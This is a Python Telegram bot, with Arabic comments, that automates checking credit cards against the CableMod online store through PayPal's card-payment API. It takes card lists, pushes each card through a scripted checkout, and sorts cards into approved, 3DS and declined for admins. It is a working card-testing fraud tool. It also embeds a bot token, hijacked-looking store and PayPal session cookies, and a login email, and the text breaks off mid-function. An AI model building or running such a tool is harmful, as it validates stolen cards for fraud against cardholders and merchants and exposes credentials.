# -*- coding: utf-8 -*-
"""
CableMod + PayPal PPCP - Telegram Bot
بوت تليجرام كامل لفحص البطاقات على موقع CableMod
"""

import os
import re
import json
import time
import asyncio
import threading
import requests
from datetime import datetime
from urllib.parse import urlencode, unquote
from typing import Optional, Dict, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ====== إعدادات البوت ======
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]  # 🔥 معرفات الأدمن
CHANNEL_ID = -1003154179190  # 🔥 معرف القناة

# ====== إعدادات الموقع ======
BASE_URL = "https://store.cablemod.com/"
CHECKOUT_URL = BASE_URL + "checkout/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

# الكوكيز الثابتة
INITIAL_COOKIES = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '_fbp': 'fb.1.1761693482072.783059716330931642',
    '_ga': 'GA1.1.543617456.1761693483',
    'woocommerce_items_in_cart': '1',
    'woocommerce_recently_viewed': '1902265',
    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16DRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
}

PAYPAL_COOKIES = {
    'enforce_policy': 'ccpa',
    'cookie_check': 'yes',
    'd_id': '52077666bd0b44258e7657ae8cb8e5bf1761605157957',
    'login_email': 'margiefos.ter7.0.1.83%40gmail.com',
    'LANG': 'en_US%3BUS',
    'TfXMWj95u2_Zf1Kmv_GCUOjlGG8': 'cvD9-96tABIM4Poym3Ti_T78QGNFcJqhBbQe6D-SUPN4BoQVLfICsIfqObYSm3dzZYYtVa63PS6nuoeXinbmhrH6XnOKBMtvuyX5LYdoN7rYG238yRymHuXF8Q-TSLrnAOv9ATNFCL6S0sWU4yz8V4YI6BSqFbRrz1sWKn1yrjv30AfGgvb78qo3usq',
    'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
    'ui_experience': 'did_set%3Dtrue%26login_type%3DEMAIL_PASSWORD%26home%3D3',
    'fn_dt': 'f78a16c47c9a4c31a4c9ea7903c6f1d4',
    'rmuc': 'OwAwuW-Vyed6BRvi6Gkk7ORgUHzp-64GENTf3U0lSkV1sce6mM5SWN7M_YuVXfAa0Kqm_3PdFZOnMPhElXeoL0iHiuPG9PH2YPVEmyT_4z6ArEMEVw3wl1_c9Zokod5ye545H5nGUQ0j9oO8bp_DpNmM1ZuOGh_5MU7GuWJHEo300CPO1ksqDrUAkprfnM9X3k3B0aECgQbDPcotu9fm0tfd8um',
    'X-PP-ADS': 'AToBEvb.aFi8BXurJKvSIyunxGo.bh47ASv2.2j-Pe0CHD41-xAGV-C9M-teOwEd9.9oaVKC36uQwjNZd7J2OptS1w',
    'nsid': 's%3AeeYy88H2oBb9GbcyszOjKk2QbiAGb9hq.WvuvZARfWO4Bk7bXI1S%2FSIxWTD%2BuYOU0h%2Bhh4anVXsA',
    '_ga': 'GA1.1.948625281.1761605189',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'whZ4Q-pT4zAOWrP5smSLQG-PjwjkfC-cCGONV1Xs6zrY3Z4Rn4C4XqDefGl3duxYq80A-5UFoTV78teM',
    'sc_f': 'UkcitVVSun6MogqMKdSPNRHq7u29vzA5Yp02abKnWu0PRTCwph8jJpmSUJDogTGs4H_1gWPJO6jMwQVuXnmhSbj1613ODnFW5ckSiW',
}

# بيانات الفاتورة
BILLING = {
    "billing_first_name": "saad",
    "billing_last_name": "saad",
    "billing_country": "US",
    "billing_address_1": "111 North Street",
    "billing_city": "Napoleon",
    "billing_state": "AK",
    "billing_postcode": "49261-9011",
    "billing_email": "i0ket57dzb@illubd.com",
}

SHIPPING = {
    "country": "US",
    "state": "AK",
    "postcode": "49261-9011",
    "city": "Napoleon",
    "address": "111 North Street",
    "address_2": ""
}

PAYMENT_METHOD = "ppcp-credit-card-gateway"

# ====== إحصائيات البوت ======
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'rejected': 0,
    'secure_3d': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'approved_cards': [],
    '3ds_cards': [],
    'declined_cards': [],
}

# ====== دالات مساعدة ======
def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
    """استخراج نص باستخدام regex"""
    m = re.search(pattern, text, flags)
    return m.group(1) if m else None

def extract_nonces(html: str) -> Dict[str, Optional[str]]:
    """استخراج جميع nonces من HTML"""
    nonces = {}
    
    nonces["update_order_review_nonce"] = (
        find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
    )
    
    nonces["process_checkout_nonce"] = (
        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
        or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
    )
    
    nonces["ppcp_nonce"] = (
        find(html, r'"data_client_id"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"ppcp[^"]*data_client_id[^"]*"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
    )
    
    nonces["create_order_nonce"] = (
        find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'"create_order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"')
        or find(html, r'ppc_create_order[^}]*nonce["\s:]*"([a-f0-9]+)"')
        or find(html, r'wc_ajax_url[^}]{0,200}nonce["\s:]*"([a-f0-9]+)"', re.S)
    )
    
    return nonces

def parse_card(card_str: str) -> Tuple[str, str, str, str]:
    """تحليل بيانات الكارت من string
    Format: CC|MM|YYYY|CVV
    Returns: (number, cvv, year, month)
    """
    parts = card_str.strip().split('|')
    if len(parts) != 4:
        raise ValueError("❌ تنسيق الكارت غير صحيح! استخدم: CC|MM|YYYY|CVV")
    
    number, month, year, cvv = parts
    
    number = number.strip()
    month = month.strip().zfill(2)
    year = year.strip()
    cvv = cvv.strip()
    
    if len(cvv) == 2:
        cvv = cvv.zfill(3)
    
    # Validation
    if len(number) < 13 or len(number) > 19:
        raise ValueError(f"❌ رقم الكارت غير صحيح: {number}")
    if len(cvv) < 3 or len(cvv) > 4:
        raise ValueError(f"❌ CVV غير صحيح: {cvv}")
    if len(year) != 4:
        raise ValueError(f"❌ السنة غير صحيحة: {year}")
    if not (1 <= int(month) <= 12):
        raise ValueError(f"❌ الشهر غير صحيح: {month}")
    
    return number, cvv, year, month

# ====== فئة معالجة الدفع ======
class WooCommercePayPal:
    def __init__(self):
        self.sess = requests.Session()
        self.sess.cookies.update(INITIAL_COOKIES)
        self.paypal_sess = requests.Session()
        self.paypal_sess.cookies.update(PAYPAL_COOKIES)
        
        self.nonces = {}
        self.paypal_token = None
        self.paypal_order_id = None
        self.client_metadata_id = None
        
    def headers_get(self):
        return {
            "user-agent": UA,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "referer": BASE_URL + "cart/",
        }
    
    def headers_ajax(self, json_content=False):
        h = {
            "user-agent": UA,
            "accept": "*/*",
            "origin": BASE_URL.rstrip("/"),
            "referer": CHECKOUT_URL,
            "x-requested-with": "XMLHttpRequest",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
        }
        h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
        return h
    
    def step1_get_checkout(self):
        """Step 1: جلب صفحة checkout واستخراج nonces"""
        r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
        r.raise_for_status()
        self.nonces = extract_nonces(r.text)
        if not self.nonces.get("update_order_review_nonce"):
            raise Exception("❌ فشل في استخراج update_order_review_nonce")
        return r.text
    
    def step2_update_order_review(self):
        """Step 2: تحديث الطلب وتفعيل PayPal"""
        post_data = {
            "wc_order_attribution_source_type": "organic",
            "_wp_http_referer": "/checkout/",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "payment_method": PAYMENT_METHOD,
            **BILLING
        }
        
        payload = {
            "security": self.nonces["update_order_review_nonce"],
            "payment_method": PAYMENT_METHOD,
            "has_full_address": "true",
            **SHIPPING,
            "post_data": urlencode(post_data),
        }
        
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "update_order_review"},
            headers=self.headers_ajax(),
            data=urlencode(payload),
            timeout=30
        )
        try:
            result = r.json()
            return result
        except:
            return None
    
    def step3_get_paypal_token(self):
        """Step 3: الحصول على PayPal client token"""
        html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
        fresh_nonces = extract_nonces(html)
        if fresh_nonces.get("ppcp_nonce"):
            self.nonces["ppcp_nonce"] = fresh_nonces["ppcp_nonce"]
        
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "ppc-data-client-id"},
            headers=self.headers_ajax(json_content=True),
            json={"nonce": self.nonces["ppcp_nonce"]},
            timeout=30
        )
        
        try:
            result = r.json()
            token_str = result.get("token", "")
            import base64
            access_token = None
            try:
                parts = token_str.split('.')
                if len(parts) >= 2:
                    payload_b64 = parts[1]
                    padding = 4 - len(payload_b64) % 4
                    if padding != 4:
                        payload_b64 += '=' * padding
                    payload_decoded = base64.urlsafe_b64decode(payload_b64)
                    payload_json = json.loads(payload_decoded)
                    if "paypal" in payload_json:
                        access_token = payload_json["paypal"].get("accessToken")
                        if access_token:
                            result["access_token"] = access_token
            except:
                pass
            
            if not access_token:
                try:
                    buttons_url = (
                        "https://www.paypal.com/smart/buttons?"
                        "clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk"
                        "&currency=USD&intent=capture&commit=true&vault=false"
                        "&components.0=buttons&components.1=card-fields"
                        "&locale.country=US&locale.lang=en"
                        "&env=production&platform=desktop"
                    )
                    buttons_headers = {
                        'user-agent': UA,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'referer': 'https://store.cablemod.com/',
                    }
                    r_buttons = self.paypal_sess.get(buttons_url, headers=buttons_headers, timeout=30)
                    if r_buttons.status_code == 200:
                        pattern = r'"facilitatorAccessToken":"([^"]+)"'
                        match = re.search(pattern, r_buttons.text)
                        if match:
                            facilitator_token = match.group(1)
                            result["access_token"] = facilitator_token
                except:
                    pass
            
            self.paypal_token = result
            return result
        except:
            raise
    
    def step4_create_paypal_order(self):
        """Step 4: إنشاء PayPal order"""
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if not self.nonces.get("create_order_nonce"):
                html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
                patterns = [
                    r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
                    r'ppc_create_order[^}]{0,200}["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
                    r'wc_ppcp_create_order[^}]{0,300}["\']nonce["\']\s*:\s*["\']([a-f0-9]+)["\']',
                    r'data-nonce=["\']([a-f0-9]+)["\'][^>]*ppc-create-order',
                    r'<script[^>]*>.*?nonce["\s:]+["\']([a-f0-9]{10})["\'].*?</script>',
                ]
                for pattern in patterns:
                    nonce = find(html, pattern, re.S)
                    if nonce and len(nonce) == 10:
                        self.nonces["create_order_nonce"] = nonce
                        break
                if not self.nonces.get("create_order_nonce"):
                    if self.nonces.get("ppcp_nonce"):
                        self.nonces["create_order_nonce"] = self.nonces["ppcp_nonce"]
                    else:
                        time.sleep(1)
                        continue
            break
        
        wp_session = None
        for cookie in self.sess.cookies:
            if cookie.name.startswith("wp_woocommerce_session_"):
                wp_session = unquote(cookie.value)
                break
        customer_id = wp_session.split("|")[0] if wp_session else "guest"
        
        form_encoded = urlencode({
            "wc_order_attribution_source_type": "organic",
            "wc_order_attribution_referrer": "https://www.google.com/",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "google",
            "wc_order_attribution_utm_medium": "organic",
            "wc_order_attribution_session_entry": "https://cablemod.com/",
            "billing_first_name": BILLING["billing_first_name"],
            "billing_last_name": BILLING["billing_last_name"],
            "billing_email": BILLING["billing_email"],
            "billing_country": BILLING["billing_country"],
            "billing_address_1": BILLING["billing_address_1"],
            "billing_city": BILLING["billing_city"],
            "billing_state": BILLING["billing_state"],
            "billing_postcode": BILLING["billing_postcode"],
            "shipping_method[0]": "flexible_shipping_single:27",
            "payment_method": PAYMENT_METHOD,
            "terms": "on",
            "terms-field": "1",
            "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", ""),
            "_wp_http_referer": "/checkout/",
        })
        
        payload = {
            "nonce": self.nonces.get("create_order_nonce", ""),
            "payer": {
                "email_address": BILLING["billing_email"],
                "name": {
                    "surname": BILLING["billing_last_name"],
                    "given_name": BILLING["billing_first_name"],
                },
                "address": {
                    "country_code": BILLING["billing_country"],
                    "address_line_1": BILLING["billing_address_1"],
                    "admin_area_1": BILLING["billing_state"],
                    "admin_area_2": BILLING["billing_city"],
                    "postal_code": BILLING["billing_postcode"],
                },
            },
            "bn_code": "Woo_PPCP",
            "context": "checkout",
            "order_id": "0",
            "payment_method": PAYMENT_METHOD,
            "form_encoded": form_encoded,
            "createaccount": False,
            "save_payment_method": False,
        }
        
        r = self.sess.post(
            BASE_URL,
            params={"wc-ajax": "ppc-create-order"},
            headers=self.headers_ajax(json_content=True),
            json=payload,
            timeout=30
        )
        
        try:
            result = r.json()
            if result.get("success"):
                self.paypal_order_id = result["data"]["id"]
                self.client_metadata_id = result["data"].get("custom_id", f"pcp_customer_{customer_id}")
                return result
            else:
                raise Exception("Failed to create order")
        except:
            raise
    
    def step5_confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
        """Step 5: تأكيد الدفع بالكارت"""
        access_token = None
        if isinstance(self.paypal_token, dict):
            access_token = self.paypal_token.get("access_token")
            if not access_token:
                token_str = self.paypal_token.get("token", "")
                import base64
                try:
                    parts = token_str.split('.')
                    if len(parts) >= 2:
                        payload_b64 = parts[1]
                        padding = 4 - len(payload_b64) % 4
                        if padding != 4:
                            payload_b64 += '=' * padding
                        decoded = base64.urlsafe_b64decode(payload_b64)
                        data = json.loads(decoded)
                        if "paypal" in data and isinstance(data["paypal"], dict):
                            access_token = data["paypal"].get("accessToken")
                except:
                    pass
        
        if not access_token:
            raise Exception("No access token available")
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': UA,
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/smart/card-field',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'dnt': '1',
            'priority': 'u=1, i',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'authorization': f'Bearer {access_token}',
        }
        
        if self.client_metadata_id:
            headers['paypal-client-metadata-id'] = self.client_metadata_id
            headers['paypal-partner-attribution-id'] = 'Woo_PPCP'
        
        headers['fn_sync_data'] = '%7B%22SC_VERSION%22%3A%222.0.4%22%7D'
        
        payload = {
            'payment_source': {
                'card': {
                    'number': card_number,
                    'security_code': cvv,
                    'expiry': f'{year}-{month}',
                },
            },
        }
        
        r = self.paypal_sess.post(
            f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source',
            headers=headers,
            json=payload,
            timeout=30
        )
        
        try:
            result = r.json()
            payer_action_link = None
            for link in result.get("links", []):
                if link.get("rel") == "payer-action":
                    payer_action_link = link.get("href")
                    break
            return result, payer_action_link
        except:
            raise
    
    def step6_3ds_verification(self):
        """Step 6: إتمام 3DS verification"""
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': UA,
            'origin': 'https://www.paypal.com',
            'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
        }
        
        # Session
        payload = {
            'token': self.paypal_order_id,
            'action': 'verify',
        }
        
        r1 = self.paypal_sess.post(
